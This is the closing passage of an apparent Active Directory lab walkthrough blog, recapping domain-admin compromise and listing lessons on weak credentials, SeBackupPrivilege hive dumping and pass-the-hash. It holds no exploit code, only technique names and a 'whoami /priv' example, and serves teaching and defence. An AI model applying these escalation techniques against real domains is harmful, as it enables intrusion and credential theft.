+</span></span></code></pre></div><h3 id=part-v-conclusion-and-lessonslearned>PART V: Conclusion and Lessons Learned</h3><p>And there you go… we’ve <strong>gained administrative access over the domain</strong>.</p><p>With Domain Administrator privileges, we now have full control over the environment. At this point, an attacker could:</p><ul><li>Access any user’s data</li><li>Dump all domain credentials</li><li>Create new privileged accounts</li><li>Modify Group Policy</li><li>Disable security controls</li></ul><p>This is why protecting privileged accounts is absolutely critical in Active Directory environments.</p><p>One weak password.<br>One exposed hash.<br>One misconfigured privilege.</p><p>That’s all it takes to lose the entire domain.</p><h3 id=lessons-learned>Lessons Learned</h3><p>From this walkthrough, we learned some very important Active Directory security lessons:</p><ol><li><strong>Weak credential management is dangerous</strong><br> Storing passwords in description fields or scripts can lead to full compromise.</li><li><strong>Valid low-privilege access is just the beginning</strong><br> Even a normal domain user can become very dangerous if misconfigurations exist.</li><li><strong>Always check privileges after getting a shell</strong><br> Commands like <code>whoami /priv</code> can reveal hidden escalation paths.</li><li><strong>Backup privileges can be abused</strong><br> <code>SeBackupPrivilege</code> may allow attackers to dump sensitive registry hives and extract password hashes.</li><li><strong>Pass-The-Hash is extremely powerful</strong><br> If an attacker gets an NTLM hash of an Administrator account, they may not even need the password.</li><li><strong>One small mistake can compromise the entire domain</strong><br> Hardcoded credentials, poor password hygiene, and excessive privileges can lead to “game over.”</li></ol><hr><h3 id=final-words>Final Words</h3><p>Thank you so much for reading.</p><p>I hope this beginner-friendly walkthrough helped you understand how small misconfigurations in Active Directory can lead to full domain compromise.</p><p>As I am writing this blog, I am also learning how Active Directory Testing bit by bit and I hope we learn together in this journey. TILL NEXT BLOG!</p></section><div class=post-tags></div></div></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/athul/archie rel=me title=GitHub><svg class="feather"><use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#github"/></svg></a><a class=border></a></div><div class=footer-info>2026 © JamesLorence | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer></div></body></html>
